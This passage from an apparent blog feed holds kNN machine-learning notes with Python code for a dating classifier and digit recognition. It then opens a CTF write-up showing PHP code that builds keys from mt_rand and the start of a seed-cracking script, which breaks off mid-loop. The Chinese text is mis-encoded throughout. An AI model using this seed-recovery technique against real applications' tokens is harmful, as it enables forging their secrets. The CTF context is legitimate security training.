class="string">&#x27;largeDoses&#x27;</span>:</span><br><span class="line">                classLableVector.append(<span class="number">3</span>)</span><br><span class="line">            index += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> returnMat, classLableVector</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">autoNorm</span>(<span class="params">dataSet</span>):</span></span><br><span class="line">    <span class="comment"># è·å–æ•°æ®çš„æœ€å€¼</span></span><br><span class="line">    minVals = dataSet.min(<span class="number">0</span>)</span><br><span class="line">    maxVals = dataSet.max(<span class="number">0</span>)</span><br><span class="line">    ranges = maxVals - minVals</span><br><span class="line">    <span class="comment"># ä¸dataSetç›¸åŒå¤§å°çš„é›¶çŸ©é˜µ</span></span><br><span class="line">    normDataSet = np.zeros(np.shape(dataSet))</span><br><span class="line">    <span class="comment"># è¿”å›dataSetçš„è¡Œæ•°</span></span><br><span class="line">    m = dataSet.shape[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># åŸå§‹å€¼å‡å»æœ€å°å€¼</span></span><br><span class="line">    normDataSet = dataSet - np.tile(minVals, (m, <span class="number">1</span>))</span><br><span class="line">    <span class="comment"># é™¤ä»¥æœ€å¤§å’Œæœ€å°å€¼çš„å·®ï¼Œå¾—åˆ°å½’ä¸€åŒ–æ•°æ®</span></span><br><span class="line">    normDataSet = normDataSet / np.tile(ranges, (m, <span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> normDataSet, ranges, minVals</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">datingClassTest</span>():</span></span><br><span class="line">    filename = <span class="string">&#x27;datingTestSet.txt&#x27;</span></span><br><span class="line">    datingDataMat, datingLabels = file2matrix(filename)</span><br><span class="line">    normMat, ranges, minVals = autoNorm(datingDataMat)</span><br><span class="line">    <span class="comment"># è·å–æ•°æ®çš„10%</span></span><br><span class="line">    hoRatio = <span class="number">0.1</span></span><br><span class="line">    <span class="comment"># è·å–normMatçš„è¡Œæ•°</span></span><br><span class="line">    m = normMat.shape[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># æµ‹è¯•æ•°æ®çš„ä¸ªæ•°</span></span><br><span class="line">    numTestVecs = int(m * hoRatio)</span><br><span class="line">    <span class="comment"># åˆ†ç±»é”™è¯¯çš„æŠ€æœ¯</span></span><br><span class="line">    errorCount = <span class="number">0.0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(numTestVecs):</span><br><span class="line">        <span class="comment"># å‰numTestVecsä¸ªæ•°æ®ä½œä¸ºæµ‹è¯•é›†,åm-numTestVecsä¸ªæ•°æ®ä½œä¸ºè®­ç»ƒé›†</span></span><br><span class="line">        classifierResult = classify0(normMat[i, :], normMat[numTestVecs:m, :],</span><br><span class="line">                                     datingLabels[numTestVecs:m], <span class="number">4</span>)</span><br><span class="line">        print(<span class="string">&quot;åˆ†ç±»ç»“æœ:%d\tçœŸå®ç±»åˆ«:%d&quot;</span> % (classifierResult, datingLabels[i]))</span><br><span class="line">        <span class="keyword">if</span> classifierResult != datingLabels[i]:</span><br><span class="line">            errorCount += <span class="number">1.0</span></span><br><span class="line">    print(<span class="string">&quot;é”™è¯¯ç‡:%f%%&quot;</span> % (errorCount / float(numTestVecs) * <span class="number">100</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    datingClassTest()</span><br></pre></td></tr></table></figure><p>åˆ†ç±»ç»“æœ</p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200906162404.png" style="zoom:67%;" /><h3 id="æ„å»ºå®Œæ•´ç³»ç»Ÿ">æ„å»ºå®Œæ•´ç³»ç»Ÿ</h3><p>æ„å»ºä¸€ä¸ªå®Œæ•´çš„ç³»ç»Ÿï¼Œé€šè¿‡è¯¥ç¨‹åºæµ·ä¼¦ä¼šåœ¨çº¦ä¼šç½‘ç«™ä¸Šæ‰¾åˆ°æŸä¸ªäººå¹¶è¾“å…¥ä»–çš„ä¿¡æ¯ã€‚ç¨‹åºä¼šç»™å‡ºå¥¹å¯¹ç”·æ–¹å–œæ¬¢ç¨‹åº¦çš„é¢„æµ‹å€¼ã€‚</p><p>åœ¨æ–‡ä»¶ä¸­åˆ›å»ºå‡½æ•°classifyPersonï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> operator</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> matplotlib.font_manager <span class="keyword">import</span> FontProperties</span><br><span class="line"><span class="keyword">import</span> matplotlib.lines <span class="keyword">as</span> mlines</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">classify0</span>(<span class="params">inX, dataSet, labels, k</span>):</span></span><br><span class="line">    <span class="comment"># è·å–dataSizeçš„è¡Œæ•°</span></span><br><span class="line">    dataSize = dataSet.shape[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># è®¡ç®—inXä¸dataSetæ¯ä¸ªç‚¹çš„æ¨ªçºµåæ ‡çš„å·®å€¼</span></span><br><span class="line">    diffMat = np.tile(inX, (dataSize, <span class="number">1</span>)) - dataSet</span><br><span class="line">    <span class="comment"># å¹³æ–¹</span></span><br><span class="line">    sqDiffMat = diffMat**<span class="number">2</span></span><br><span class="line">    <span class="comment"># sum()æ‰€æœ‰å…ƒç´ ç›¸åŠ ï¼Œsum(0)åˆ—ç›¸åŠ ï¼Œsum(1)è¡Œç›¸åŠ </span></span><br><span class="line">    sqDistances = sqDiffMat.sum(axis=<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># å¼€æ–¹</span></span><br><span class="line">    distances = sqDistances**<span class="number">0.5</span></span><br><span class="line">    <span class="comment"># è¿”å›distancesä¸­å…ƒç´ ä»å°åˆ°å¤§æ’åºåçš„ç´¢å¼•å€¼</span></span><br><span class="line">    sortedDistIndices = distances.argsort()</span><br><span class="line">    <span class="comment"># è®°å½•ç±»åˆ«æ¬¡æ•°çš„å­—å…¸</span></span><br><span class="line">    classCount = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(k):</span><br><span class="line">        <span class="comment"># å–å‡ºæ’åºåçš„ç¬¬iä¸ªçš„ç‰¹å¾</span></span><br><span class="line">        voteIlabel = labels[sortedDistIndices[i]]</span><br><span class="line">        <span class="comment"># è®¡ç®—ç±»åˆ«æ¬¡æ•°</span></span><br><span class="line">        classCount[voteIlabel] = classCount.get(voteIlabel, <span class="number">0</span>) + <span class="number">1</span></span><br><span class="line">    <span class="comment"># æ ¹æ®å­—å…¸çš„å€¼ï¼Œå³ç±»åˆ«æ¬¡æ•°è¿›è¡Œé™åºæ’åº</span></span><br><span class="line">    sortedClassCount = sorted(classCount.items(), key=operator.itemgetter(<span class="number">1</span>), reverse=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">return</span> sortedClassCount[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">file2matrix</span>(<span class="params">filename</span>):</span></span><br><span class="line">    <span class="keyword">with</span> open(filename) <span class="keyword">as</span> fr:</span><br><span class="line">        <span class="comment"># è¯»å–æ•°æ®é›†</span></span><br><span class="line">        array0Lines = fr.readlines()</span><br><span class="line">        <span class="comment"># æ•°æ®é›†çš„è¡Œæ•°ï¼Œå³æœ‰å¤šå°‘æ¡æ•°æ®</span></span><br><span class="line">        numberOfLines = len(array0Lines)</span><br><span class="line">        <span class="comment"># ç”ŸæˆnumberOfLinesè¡Œï¼Œ3åˆ—çš„é›¶çŸ©é˜µä½œä¸ºç‰¹å¾çŸ©é˜µçš„åˆå§‹å€¼</span></span><br><span class="line">        returnMat = np.zeros((numberOfLines, <span class="number">3</span>))</span><br><span class="line">        <span class="comment"># åˆ†ç±»æ ‡ç­¾å‘é‡</span></span><br><span class="line">        classLableVector = []</span><br><span class="line">        index = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> array0Lines:</span><br><span class="line">            <span class="comment"># åˆ†å‰²æ•°æ®ï¼Œæ¯ä¸ªlistä¸€å…±æœ‰å››ä¸ªæ•°æ®ï¼Œå³ä¸‰ä¸ªç‰¹å¾å€¼å’Œä¸€ä¸ªæ ‡ç­¾</span></span><br><span class="line">            listFromLine = line.strip().split(<span class="string">&#x27;\t&#x27;</span>)</span><br><span class="line">            <span class="comment"># å°†å‰ä¸‰ä¸ªæ•°æ®æå–å‡ºæ¥ï¼Œå­˜æ”¾è‡³ç‰¹å¾çŸ©é˜µ</span></span><br><span class="line">            returnMat[index, :] = listFromLine[<span class="number">0</span>:<span class="number">3</span>]</span><br><span class="line">            <span class="comment"># å°†æœ€åä¸€ä¸ªæ•°æ®æå–å‡ºæ¥ï¼Œå­˜æ”¾è‡³æ ‡ç­¾å‘é‡ï¼Œå¹¶è½¬æ¢ä¸ºæ•´å‹è¡¨ç¤º</span></span><br><span class="line">            label = listFromLine[<span class="number">-1</span>]</span><br><span class="line">            <span class="keyword">if</span> label == <span class="string">&#x27;didntLike&#x27;</span>:</span><br><span class="line">                classLableVector.append(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">elif</span> label == <span class="string">&#x27;smallDoses&#x27;</span>:</span><br><span class="line">                classLableVector.append(<span class="number">2</span>)</span><br><span class="line">            <span class="keyword">elif</span> label == <span class="string">&#x27;largeDoses&#x27;</span>:</span><br><span class="line">                classLableVector.append(<span class="number">3</span>)</span><br><span class="line">            index += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> returnMat, classLableVector</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">autoNorm</span>(<span class="params">dataSet</span>):</span></span><br><span class="line">    <span class="comment"># è·å–æ•°æ®çš„æœ€å€¼</span></span><br><span class="line">    minVals = dataSet.min(<span class="number">0</span>)</span><br><span class="line">    maxVals = dataSet.max(<span class="number">0</span>)</span><br><span class="line">    ranges = maxVals - minVals</span><br><span class="line">    <span class="comment"># ä¸dataSetç›¸åŒå¤§å°çš„é›¶çŸ©é˜µ</span></span><br><span class="line">    normDataSet = np.zeros(np.shape(dataSet))</span><br><span class="line">    <span class="comment"># è¿”å›dataSetçš„è¡Œæ•°</span></span><br><span class="line">    m = dataSet.shape[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># åŸå§‹å€¼å‡å»æœ€å°å€¼</span></span><br><span class="line">    normDataSet = dataSet - np.tile(minVals, (m, <span class="number">1</span>))</span><br><span class="line">    <span class="comment"># é™¤ä»¥æœ€å¤§å’Œæœ€å°å€¼çš„å·®ï¼Œå¾—åˆ°å½’ä¸€åŒ–æ•°æ®</span></span><br><span class="line">    normDataSet = normDataSet / np.tile(ranges, (m, <span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> normDataSet, ranges, minVals</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">classifyPerson</span>():</span></span><br><span class="line">    <span class="comment"># è¾“å‡ºç»“æœ</span></span><br><span class="line">    resultList = [<span class="string">&#x27;è®¨åŒ&#x27;</span>, <span class="string">&#x27;æœ‰äº›å–œæ¬¢&#x27;</span>, <span class="string">&#x27;éå¸¸å–œæ¬¢&#x27;</span>]</span><br><span class="line">    <span class="comment"># ä¸‰ç»´ç‰¹å¾ç”¨æˆ·è¾“å…¥</span></span><br><span class="line">    precentTats = float(input(<span class="string">&quot;ç©è§†é¢‘æ¸¸æˆæ‰€è€—æ—¶é—´ç™¾åˆ†æ¯”:&quot;</span>))</span><br><span class="line">    ffMiles = float(input(<span class="string">&quot;æ¯å¹´è·å¾—çš„é£è¡Œå¸¸å®¢é‡Œç¨‹æ•°:&quot;</span>))</span><br><span class="line">    iceCream = float(input(<span class="string">&quot;æ¯å‘¨æ¶ˆè´¹çš„å†°æ¿€æ·‹å…¬å‡æ•°:&quot;</span>))</span><br><span class="line"></span><br><span class="line">    filename = <span class="string">&#x27;datingTestSet.txt&#x27;</span></span><br><span class="line">    datingDataMat, datingLabels = file2matrix(filename)</span><br><span class="line">    normMat, ranges, minVals = autoNorm(datingDataMat)</span><br><span class="line">    <span class="comment"># ç”ŸæˆNumPyæ•°ç»„,æµ‹è¯•é›†</span></span><br><span class="line">    inArr = np.array([ffMiles, precentTats, iceCream])</span><br><span class="line">    <span class="comment"># æµ‹è¯•é›†å½’ä¸€åŒ–</span></span><br><span class="line">    norminArr = (inArr - minVals) / ranges</span><br><span class="line">    <span class="comment"># è¿”å›åˆ†ç±»ç»“æœ</span></span><br><span class="line">    classifierResult = classify0(norminArr, normMat, datingLabels, <span class="number">3</span>)</span><br><span class="line">    <span class="comment"># æ‰“å°ç»“æœ</span></span><br><span class="line">    print(<span class="string">&quot;ä½ å¯èƒ½%sè¿™ä¸ªäºº&quot;</span> % (resultList[classifierResult - <span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    classifyPerson()</span><br></pre></td></tr></table></figure><p>è¾“å…¥ç¤ºä¾‹ï¼š</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200906163002.png" alt=""></p><h2 id="0x04-kNNå®æˆ˜ä¹‹sklearnæ‰‹å†™æ•°å­—è¯†åˆ«">0x04 kNNå®æˆ˜ä¹‹sklearnæ‰‹å†™æ•°å­—è¯†åˆ«</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> operator</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> listdir</span><br><span class="line"><span class="keyword">from</span> sklearn.neighbors <span class="keyword">import</span> KNeighborsClassifier <span class="keyword">as</span> kNN</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">img2vector</span>(<span class="params">filename</span>):</span></span><br><span class="line">    <span class="comment"># åˆ›å»ºä¸€ä¸ª1*1024çš„é›¶å‘é‡</span></span><br><span class="line">    returnVect = np.zeros((<span class="number">1</span>, <span class="number">1024</span>))</span><br><span class="line">    <span class="comment"># æ‰“å¼€æ–‡ä»¶</span></span><br><span class="line">    <span class="keyword">with</span> open(filename, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">            <span class="comment"># è¯»å–ä¸€è¡Œæ•°æ®</span></span><br><span class="line">            lineStr = f.readline()</span><br><span class="line">            <span class="comment"># æ¯ä¸€è¡Œå‰32ä¸ªå…ƒç´ ä¾æ¬¡æ·»åŠ åˆ°returnVectä¸­</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">                returnVect[<span class="number">0</span>, i*<span class="number">32</span>+j] = int(lineStr[j])</span><br><span class="line">        <span class="comment"># è¿”å›è½¬æ¢åçš„1*1024å‘é‡</span></span><br><span class="line">        <span class="keyword">return</span> returnVect</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handwritingClassTest</span>():</span></span><br><span class="line">    <span class="comment"># æµ‹è¯•é›†lables</span></span><br><span class="line">    hwlables = []</span><br><span class="line">    <span class="comment"># è¿”å›trainingDigitsä¸‹çš„æ–‡ä»¶å</span></span><br><span class="line">    trainingFileList = listdir(<span class="string">&#x27;trainingDigits&#x27;</span>)</span><br><span class="line">    <span class="comment"># è¿”å›æ–‡ä»¶ä¸ªæ•°</span></span><br><span class="line">    m = len(trainingFileList)</span><br><span class="line">    <span class="comment"># åˆå§‹åŒ–è®­ç»ƒçŸ©é˜µ</span></span><br><span class="line">    trainingMat = np.zeros((m, <span class="number">1024</span>))</span><br><span class="line">    <span class="comment"># ä»æ–‡ä»¶åä¸­è§£æå‡ºè®­ç»ƒé›†çš„ç±»åˆ«</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(m):</span><br><span class="line">        <span class="comment"># è·å¾—æ–‡ä»¶å</span></span><br><span class="line">        fileName = trainingFileList[i]</span><br><span class="line">        <span class="comment"># è·å¾—åˆ†ç±»çš„æ•°å­—</span></span><br><span class="line">        classNumber = int(fileName.split(<span class="string">&#x27;_&#x27;</span>)[<span class="number">0</span>])</span><br><span class="line">        <span class="comment"># å°†ç±»åˆ«æ·»åŠ åˆ°hwlables</span></span><br><span class="line">        hwlables.append(classNumber)</span><br><span class="line">        trainingMat[i, :] = img2vector(<span class="string">&#x27;trainingDigits/&#123;&#125;&#x27;</span>.format(fileName))</span><br><span class="line">    <span class="comment"># æ„å»ºkNNåˆ†ç±»å™¨</span></span><br><span class="line">    neigh = kNN(n_neighbors=<span class="number">3</span>, algorithm=<span class="string">&#x27;auto&#x27;</span>)</span><br><span class="line">    <span class="comment"># æ‹Ÿåˆæ¨¡å‹</span></span><br><span class="line">    neigh.fit(trainingMat, hwlables)</span><br><span class="line">    <span class="comment"># è¿”å›testDigitsç›®å½•ä¸‹æ–‡ä»¶</span></span><br><span class="line">    testFileList = listdir(<span class="string">&#x27;testDigits&#x27;</span>)</span><br><span class="line">    <span class="comment"># é”™è¯¯æ£€æµ‹è®¡æ•°</span></span><br><span class="line">    errorCount = <span class="number">0.0</span></span><br><span class="line">    <span class="comment"># æµ‹è¯•æ•°æ®çš„æ•°é‡</span></span><br><span class="line">    mTest = len(testFileList)</span><br><span class="line">    <span class="comment"># ä»æ–‡ä»¶ä¸­è§£æå‡ºæµ‹è¯•é›†çš„ç±»åˆ«å¹¶åˆ†ç±»</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(mTest):</span><br><span class="line">        <span class="comment"># è·å¾—æ–‡ä»¶å</span></span><br><span class="line">        fileName = testFileList[i]</span><br><span class="line">        <span class="comment"># è·å¾—åˆ†ç±»çš„æ•°å­—</span></span><br><span class="line">        classNumber = int(fileName.split(<span class="string">&#x27;_&#x27;</span>)[<span class="number">0</span>])</span><br><span class="line">        <span class="comment"># è·å¾—æµ‹è¯•é›†çš„1*1024å‘é‡ï¼Œç”¨äºè®­ç»ƒ</span></span><br><span class="line">        testVect = img2vector(<span class="string">&#x27;testDigits/&#123;&#125;&#x27;</span>.format(fileName))</span><br><span class="line">        <span class="comment"># è·å¾—é¢„æµ‹ç»“æœ</span></span><br><span class="line">        classifierResult = neigh.predict(testVect)</span><br><span class="line">        print(<span class="string">&quot;åˆ†ç±»è¿”å›ç»“æœä¸º%d\tçœŸå®ç»“æœä¸º%d&quot;</span> % (classifierResult, classNumber))</span><br><span class="line">        <span class="keyword">if</span> classifierResult != classNumber:</span><br><span class="line">            errorCount += <span class="number">1.0</span></span><br><span class="line">    print(<span class="string">&quot;æ€»å…±é”™äº†%dä¸ªæ•°æ®\né”™è¯¯ç‡ä¸º%f%%&quot;</span> % (errorCount, errorCount / mTest * <span class="number">100</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    handwritingClassTest()</span><br></pre></td></tr></table></figure><h2 id="0x05-kNNå°ç»“">0x05 kNNå°ç»“</h2><h3 id="åŸºæœ¬åŸç†">åŸºæœ¬åŸç†</h3><p>é€šè¿‡è·ç¦»åº¦é‡æ¥è®¡ç®—æŸ¥è¯¢ç‚¹ï¼ˆquery pointï¼‰ä¸æ¯ä¸ªè®­ç»ƒæ•°æ®ç‚¹çš„è·ç¦»ï¼Œç„¶åé€‰å‡ºä¸æŸ¥è¯¢ç‚¹ï¼ˆquery pointï¼‰ç›¸è¿‘çš„Kä¸ªæœ€é‚»ç‚¹ï¼ˆK nearest neighborsï¼‰ï¼Œä½¿ç”¨åˆ†ç±»å†³ç­–æ¥é€‰å‡ºå¯¹åº”çš„æ ‡ç­¾æ¥ä½œä¸ºè¯¥æŸ¥è¯¢ç‚¹çš„æ ‡ç­¾ã€‚</p><h3 id="kNNä¸‰è¦ç´ ">kNNä¸‰è¦ç´ </h3><h4 id="kçš„å–å€¼">kçš„å–å€¼</h4><p>å¯¹æŸ¥è¯¢ç‚¹æ ‡ç­¾å½±å“æ˜¾è‘—ï¼ˆæ•ˆæœæ‹”ç¾¤ï¼‰ã€‚kå€¼å°çš„æ—¶å€™ï¼Œè¿‘ä¼¼è¯¯å·®å°ï¼Œä¼°è®¡è¯¯å·®å¤§ã€‚kå€¼å¤§ï¼Œè¿‘ä¼¼è¯¯å·®å¤§ï¼Œä¼°è®¡è¯¯å·®å°ã€‚</p><h4 id="è·ç¦»åº¦é‡">è·ç¦»åº¦é‡</h4><p>è·ç¦»åº¦é‡é€šå¸¸ä¸ºæ¬§å¼è·ç¦»ï¼ˆEuclidean distanceï¼‰ï¼Œè¿˜å¯ä»¥æ˜¯ Minkowski è·ç¦»æˆ–è€…æ›¼å“ˆé¡¿è·ç¦»ã€‚ä¹Ÿå¯ä»¥æ˜¯åœ°ç†ç©ºé—´ä¸­çš„ä¸€äº›è·ç¦»å…¬å¼ã€‚</p><h4 id="åˆ†ç±»å†³ç­–">åˆ†ç±»å†³ç­–</h4><p>åˆ†ç±»å†³ç­–åœ¨åˆ†ç±»é—®é¢˜ä¸­é€šå¸¸ä¸ºé€šè¿‡å°‘æ•°æœä»å¤šæ•°æ¥é€‰å–ç¥¨æ•°æœ€å¤šçš„æ ‡ç­¾ï¼Œåœ¨å›å½’é—®é¢˜ä¸­é€šå¸¸ä¸º Kä¸ªæœ€é‚»ç‚¹çš„æ ‡ç­¾çš„å¹³å‡å€¼ã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;ã€Šæœºå™¨å­¦ä¹ å®æˆ˜ã€‹ç¬”è®°â€”â€”KNNç®—æ³•&quot;&gt;ã€Šæœºå™¨å­¦ä¹ å®æˆ˜ã€‹ç¬”è®°â€”â€”KNNç®—æ³•&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;å‚è€ƒï¼š&lt;a href=&quot;https://cuijiahua.com/blog/2017/11/ml_1_knn.html&quot;&gt;https://cuij
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>é¦–å±Šé’“é±¼åŸæ¯CTFæ¯”èµ›</title>
    <link href="http://ca0y1h.top/Web_security/ctf_writeup/22.%E9%A6%96%E5%B1%8A%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AFCTF/"/>
    <id>http://ca0y1h.top/Web_security/ctf_writeup/22.%E9%A6%96%E5%B1%8A%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AFCTF/</id>
    <published>2020-08-28T12:28:36.000Z</published>
    <updated>2020-09-06T13:04:20.962Z</updated>
    
    <content type="html"><![CDATA[<h1 id="â€œé’“é±¼åŸæ¯â€å›½é™…ç½‘ç»œå®‰å…¨æŠ€èƒ½å¤§èµ›Writeup">â€œé’“é±¼åŸæ¯â€å›½é™…ç½‘ç»œå®‰å…¨æŠ€èƒ½å¤§èµ›Writeup</h1><h2 id="easyseed">easyseed</h2><p>index.bakï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$lock = random(<span class="number">6</span>, <span class="string">&#x27;abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ&#x27;</span>);</span><br><span class="line">$key = random(<span class="number">16</span>, <span class="string">&#x27;1294567890abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ&#x27;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">random</span>(<span class="params">$length, $chars = <span class="string">&#x27;0123456789ABC&#x27;</span></span>) </span>&#123;</span><br><span class="line">    $hash = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    $max = strlen($chars) - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $length; $i++) &#123;</span><br><span class="line">        $hash .= $chars[mt_rand(<span class="number">0</span>, $max)];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $hash;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨php_mt_randéšæœºæ•°ç§å­çˆ†ç ´ã€‚<br>ç”¨è„šæœ¬ç”Ÿæˆphp_mt_randå·¥å…·çš„å‚æ•°ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">str1 = <span class="string">&#x27;abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line">str2 = <span class="string">&#x27;vEUHaY&#x27;</span></span><br><span class="line">str3 = str1[::<span class="number">-1</span>]</span><br><span class="line">length = len(str2)</span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i 